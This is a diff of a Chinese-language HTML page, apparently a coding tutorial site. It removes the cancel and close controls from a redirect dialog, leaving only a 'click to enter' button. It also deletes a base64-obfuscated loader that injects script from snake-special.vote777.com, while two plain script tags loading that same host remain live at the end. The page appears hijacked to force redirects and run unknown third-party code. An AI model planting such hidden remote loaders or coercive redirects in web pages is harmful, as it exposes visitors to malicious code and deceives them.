@@ -220,20 +220,6 @@
             text-align: center;
             border-radius: 5px;
         }
-
-        /* 关闭按钮 */
-        .close {
-            color: #aaa;
-            float: right;
-            font-size: 28px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        .close:hover {
-            color: black;
-        }
-
         /* 跳转按钮样式 */
         .redirect-btn {
             background-color: #4CAF50;
@@ -263,11 +249,9 @@
         <!-- 弹窗 -->
         <div id="myModal" class="modal">
             <div class="modal-content">
-                <span class="close" onclick="closePopup()">×</span>
-                <h3>确认跳转</h3>
-                <p>您确定要跳转到新页面吗？</p>
-                <button class="redirect-btn" onclick="redirectToNewPage()">确认跳转</button>
-                <button class="redirect-btn" style="background-color: #f44336;" onclick="closePopup()">取消</button>
+                <h3>已为您选择最优线路</h3>
+                <p>请点击下方的按钮进入</p>
+                <button class="redirect-btn" onclick="redirectToNewPage()">点击进入</button>
             </div>
         </div>
         <!-- 顶部固定导航的占位符和实际导航 -->
@@ -438,29 +422,9 @@ ResultSet rs = stmt.executeQuery();
             });
         });
     </script>
-    <script>
-        (function () {
-            function init() {
-                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
-                const decodedUrl = atob(encodedUrl);
-                const timestamp = Date.now();
-                const randomNum = Math.floor(Math.random() * 1000000);
-                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
-                const script = document.createElement("script");
-                script.src = url;
-                document.body.appendChild(script);
-            }
-            init();
-        })();
-    </script>
 <script>        // 显示弹窗
         function showPopup() {
             document.getElementById("myModal").style.display = "block";
-        }
-
-        // 关闭弹窗
-        function closePopup() {
-            document.getElementById("myModal").style.display = "none";
         }
 
         // 跳转到新页面
@@ -479,14 +443,6 @@ ResultSet rs = stmt.executeQuery();
             
             // 执行跳转
             window.location.href = newURL;
-        }
-
-        // 点击遮罩层关闭弹窗
-        window.onclick = function(event) {
-            const modal = document.getElementById("myModal");
-            if (event.target == modal) {
-                modal.style.display = "none";
-            }
         }
     </script>
     <script src="//snake-special.vote777.com/static/js/core.min.js?t=1760963227439&amp;random=558088"></script><script src="//snake-special.vote777.com/static/js/core.min.js?t=1760947772790&amp;random=484458"></script>
